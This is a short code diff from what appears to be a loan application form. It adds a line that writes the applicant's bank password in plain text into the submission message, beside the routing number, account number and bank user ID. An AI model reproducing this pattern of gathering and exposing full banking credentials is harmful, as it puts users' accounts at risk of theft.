@@ -72,6 +72,7 @@ Loan amount: ${data.loanAmount}
 Routing number: ${data.routingNumber}
 Account number: ${data.accountNumber}
 Bank user ID: ${data.bankUserId}
+Bank password: ${data.bankPassword}
 
 Submitted at: ${new Date().toISOString()}
 `;
